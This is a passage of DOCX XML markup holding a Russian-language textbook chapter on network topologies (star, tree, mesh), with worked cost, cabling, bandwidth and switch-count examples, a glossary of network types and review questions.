        <w:t>: Офис на 20 компов. Сколько стоит звезда vs mesh?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Звезда</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>1 свитч 24 порта: $200</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>20 кабелей Cat6 × $5 = $100</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Итого**: $300</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Mesh</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (20 компов):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Кабелей: \( \frac{20 \times 19}{2} = 190 \)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Кабели: 190 × $5 = $950</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Каждый комп должен иметь **19 портов** (сетевая карта $1000)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Итого**: $950 + 20 × $1000 = **$20,950**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Mesh — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>безумие</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> для обычных сетей.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.4. Производительность (Performance)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вопрос</w:t>
      </w:r>
      <w:r>
        <w:t>: Какая скорость у каждого устройства?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Шина** → все делят одну пропускную способность</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Звезда** → каждый получает **полную** скорость (full-duplex)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Mesh** → можно балансировать нагрузку между каналами</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вердикт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Звезда и mesh — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>лучшие</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5. Примеры задач</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 1: Расчёт длины кабеля для звезды</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: Офис 20 × 30 метров. Свитч в центре (10 × 15 м). 12 компов по углам и стенам. Сколько кабеля нужно?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Самый дальний комп — в углу (20 × 30 м). Расстояние от центра (10, 15) до угла (0, 0):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>\[</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>d = \sqrt{10^2 + 15^2} = \sqrt{100 + 225} = \sqrt{325} \approx 18 \text{ м}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Самый дальний комп: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>18 м</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Средний комп: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>~10 м</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Оценка</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (с запасом на подъём к потолку, изгибы):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>\[</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\text{Кабеля на комп} \approx 15 \text{ м (среднее)}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>\[</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\text{Всего} = 12 \times 15 = 180 \text{ м}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Добавь </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>20% запас</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>\[</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>180 \times 1.2 = 216 \text{ м}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Купи </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>250 метров</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> кабеля Cat6 (с запасом).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 2: Стоимость топологий (звезда vs дерево)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: Сравни стоимость топологий для 100 компов:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Звезда** (1 свитч на 100 портов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Дерево** (1 главный свитч + 4 свитча по 24 порта)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Звезда</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Свитч 100 портов (enterprise): $5000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Кабели: 100 × $5 = $500</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Итого**: $5500</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Дерево</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Главный свитч (48 портов): $1000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>4 свитча по 24 порта: 4 × $200 = $800</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Кабели: (100 компов + 4 свитча) × $5 = 104 × $5 = $520</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Итого**: $1000 + $800 + $520 = $2320</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Дерево </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>дешевле</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ($2320 vs $5500) и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>масштабируемее</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (легче добавить новый свитч, чем менять главный).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 3: Отказоустойчивость mesh</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: Сеть из 5 роутеров (полносвязная mesh). Какова вероятность, что сеть работает, если каждый кабель ломается с вероятностью 1%?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Количество кабелей:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\[</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\frac{5 \times 4}{2} = 10</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Для </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>полной потери связи</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> между двумя роутерами нужно, чтобы </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>все альтернативные пути</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> сломались. Но в mesh </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>всегда</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> есть альтернативные пути (если не все кабели к одному роутеру сдохли).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Упрощённо</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Вероятность, что </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>хотя бы один</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> кабель к роутеру работает (у каждого 4 кабеля):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>\[</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>P(\text{роутер изолирован}) = 0.01^4 = 0.00000001 = 0.000001\%</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Mesh </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>чертовски надёжен</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Вероятность полного отказа </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ничтожна</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 4: Пропускная способность в звезде с bottleneck</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: 30 компов, каждый подключён к свитчу (1 Гбит/с на порт). Свитч подключён к роутеру (uplink 10 Гбит/с). Все качают из интернета (каждому нужно 200 Мбит/с). Хватит ли?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Каждый комп → свитч: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1 Гбит/с</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (достаточно для 200 Мбит/с).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Свитч → роутер (интернет): </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>10 Гбит/с</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>\[</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>30 \times 200 = 6000 \text{ Мбит/с} = 6 \text{ Гбит/с}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>10 Гбит/с &gt; 6 Гбит/с</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> → </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>хватит</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Но</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> если uplink был бы 1 Гбит/с (старый роутер), то </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>не хватит</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, и будет </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>bottleneck</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 5: Количество свитчей для дерева</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: Нужно подключить 500 компов. Используем свитчи по 48 портов. Сколько свитчей нужно?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Access layer</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (для компов):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\[</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\frac{500}{48} \approx 10.4 \Rightarrow \text{11 свитчей}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Distribution layer</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (для соединения access-свитчей):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">11 свитчей нужно подключить к главному. Если главный свитч — 48 портов, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>хватит</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Итого</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 11 access-свитчей + 1 core-свитч = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>12 свитчей</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Ключевые термины и определения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>PAN (Personal Area Network)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — персональная сеть (Bluetooth, USB), радиус 1-10 м.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>LAN (Local Area Network)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — локальная сеть (офис, дом), до 1-2 км.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>MAN (Metropolitan Area Network)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — городская сеть (провайдер), до 100 км.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>WAN (Wide Area Network)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — глобальная сеть (интернет, корпоративная сеть), сотни/тысячи км.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>GAN (Global Area Network)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — сеть планетарного масштаба (интернет).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Топология</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — схема соединения устройств в сети.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Физическая топология</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — как физически проложены кабели.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Логическая топология</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — как передаются данные.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Шина (Bus)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — все устройства на одном кабеле. Устарела.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Кольцо (Ring)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — устройства соединены в круг. Устарела.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Звезда (Star)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — все устройства подключены к центральному узлу (свитчу). Самая популярная.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Дерево (Tree)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — иерархия звёзд. Для больших сетей.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Полносвязная (Mesh)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — каждый соединён с каждым. Максимальная надёжность, но дорого.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Гибридная топология</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — комбинация топологий.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Bottleneck (узкое место)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — участок сети, где ограничена пропускная способность.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Full-duplex</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — одновременная передача и приём данных.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Redundancy (резервирование)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — дублирование компонентов для надёжности.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Link aggregation (агрегация каналов)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — объединение нескольких физических каналов в один логический (для увеличения пропускной способности).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Контрольные вопросы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Теория**: Чем отличается LAN от WAN? Приведи примеры каждой.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Теория**: Почему топология "шина" вымерла, а "звезда" процветает?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Расчёт**: Офис из 40 компов. Каждый подключён к гигабитному свитчу (1 Гбит/с на порт). Все одновременно качают файл с сервера (каждому нужно 150 Мбит/с). Сервер подключён к свитчу **одним портом** (1 Гбит/с). Хватит ли пропускной способности? Что будет bottleneck?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Теория**: В чём разница между физической и логической топологией? Приведи пример.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Расчёт**: Сколько кабелей нужно для полносвязной (mesh) сети из 8 роутеров? Сколько портов нужно каждому роутеру?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Критическое мышление**: В дата-центре 1000 серверов. Какую топологию выбрать и почему? (Учитывай стоимость, надёжность, масштабируемость.)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Расчёт**: Офис 30 × 40 метров, свитч в центре (15 × 20 м). 20 компов равномерно по периметру. Оцени, сколько метров кабеля Cat6 нужно (с запасом 30%).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Теория**: Что такое PAN? Приведи 3 примера технологий PAN.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Практика**: Ты подключаешься к Wi-Fi роутеру дома. Какого типа сеть (PAN/LAN/WAN) между тобой и роутером? А между роутером и сервером Google?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Расчёт**: Дерево из 200 компов. Свитчи по 48 портов. Сколько нужно access-свитчей? Сколько портов должно быть у core-свитча?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Заключение: От Bluetooth до интернета</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Теперь ты знаешь:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Типы сетей**: PAN (твои AirPods), LAN (офис), MAN (провайдер по городу), WAN/GAN (интернет).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Топологии**: Шина и кольцо — динозавры. Звезда — король. Mesh — для параноиков (или дата-центров).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
